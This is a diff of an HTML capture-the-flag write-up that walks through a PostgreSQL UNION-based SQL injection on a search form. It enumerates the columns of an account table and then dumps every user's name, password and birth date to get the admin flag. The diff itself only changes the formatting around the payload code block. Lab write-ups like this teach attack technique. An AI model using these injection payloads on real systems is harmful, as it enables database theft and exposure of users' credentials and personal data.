@@ -374,12 +374,8 @@ document.write(`
 <p>Here is our new query: ‘UNION SELECT null, string_agg(column_name, ‘,’), null, null, null FROM information_schema.columns WHERE table_name = ‘simplesearch_account’ order by 1 desc–</p>
 <p>Let’s concatenate the columns of ‘simplesearch_account’ from the columns table of the PostgreSQL configuration, and BINGO! We recognize the first_name, last_name, and birth_date of our site. Id is indeed the first column on which we order the display and a password column 😊.</p>
 <p>We are now in the home stretch of our hacking. We will now have to retrieve all the data from this table (i.e., dump the database). The next tweet is the solution.</p>
-<div class="cell docutils container">
-<div class="cell_input docutils container">
-<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39; OR &#39;&#39;=&#39;&#39; UNION SELECT 1000, STRING_AGG(id||&#39;</span><span class="s2">&quot;&quot;&quot;&#39;||first_name||&#39;&quot;&quot;&quot;</span><span class="s1">&#39;||last_name||&#39;</span><span class="s2">&quot;&quot;&quot;&#39;||password||&#39;&quot;&quot;&quot;</span><span class="s1">&#39;||birth_date, &#39;</span><span class="o">|</span><span class="s1">&#39;),&#39;</span><span class="n">a</span><span class="s1">&#39;,DATE(&#39;</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">01</span><span class="s1">&#39;),&#39;</span><span class="n">a</span><span class="s1">&#39; FROM simplesearch_account ORDER BY 1 DESC-- </span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39; OR &#39;&#39;=&#39;&#39; UNION SELECT 1000, STRING_AGG(id||&#39;</span><span class="s2">&quot;&quot;&quot;&#39;||first_name||&#39;&quot;&quot;&quot;</span><span class="s1">&#39;||last_name||&#39;</span><span class="s2">&quot;&quot;&quot;&#39;||password||&#39;&quot;&quot;&quot;</span><span class="s1">&#39;||birth_date, &#39;</span><span class="o">|</span><span class="s1">&#39;),&#39;</span><span class="n">a</span><span class="s1">&#39;,DATE(&#39;</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">01</span><span class="s1">&#39;),&#39;</span><span class="n">a</span><span class="s1">&#39; FROM simplesearch_account ORDER BY 1 DESC-- </span>
 </pre></div>
-</div>
-</div>
 </div>
 <p>Concatenation of columns. Rows separated by | and 3 ” for the cols.</p>
 <p>And there you have it. Now you can click on the http query to retrieve the result and find the flag of the Admin user 😊: FLAG{Congrats_y0u_pwned_it}.</p>
